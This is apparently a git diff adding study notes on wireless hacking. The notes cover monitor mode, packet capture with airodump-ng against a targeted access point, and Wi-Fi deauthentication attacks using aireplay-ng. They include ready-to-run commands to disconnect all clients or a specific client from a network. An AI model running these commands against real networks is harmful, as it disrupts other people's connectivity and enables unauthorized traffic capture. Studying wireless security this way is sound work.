@@ -81,5 +81,73 @@ Two ways to capture packets
 Part of the Aircrack-ng package. It's a packet sniffer that captures all traffic within
 range. We can also scan and gather info about wifi networks around us.
 
+```
+// enable monitor mode
+$ airmon-ng start [interface]
+// start airodump-ng
+$ airodump-ng [interface]
+// stop monitor mode
+$ airmon-ng stop [interface]
+```
+
+Manual monitor mode
+```
+$ ifconfig wlan0 down
+$ iwconfig wlan0 mode monitor
+$ ifconfig wlan0 up
+$ airodump-ng wlan0
+```
+
+One more method
+```
+$ airmon-ng
+$ ifconfig wlan0 down
+$ airmon-ng check kill
+$ airmon-ng start wlan0
+$ iwconfig wlan0mon
+```
+
+Running airmon-ng
+```
+$ airodump-ng mon0
+// Start sniffing traffic
+BSSID - MAC address
+PWR - How close the device is
+Data - # of Useful packets
+And various encryption forms
+
+$ airodump-ng --channel [c] --bssid [b] --write [o] [interface]
+// Example of specific target
+// The second section contains clients associated with the access point
+// The output will use 4 formats, including .cap, .csv & .xml
+```
+
+## Deauthentication Attacks
+
+Disconnect any device from any network within the wi-fi range, even if the network
+is protected with a key.
+
+Hacker sends deauthentication packets to the router, pretending to be the target machine
+by spoofing the MAC address.
+
+Hacker simultaneously sends packets to the target machine (spoofing the router MAC address)
+telling it to re-authenticate itself.
+
+### Aireplay-ng
+
+De-authenticate all clients
+```
+aireplay-ng --deauth [# of packets] -a [AP] [interface]
+```
+
+De-authenitcate specific client
+```
+aireplay-ng --deauth [# of packets] -a [AP] -c [target] [interface]
+```
+
+
+
+
+
 
 
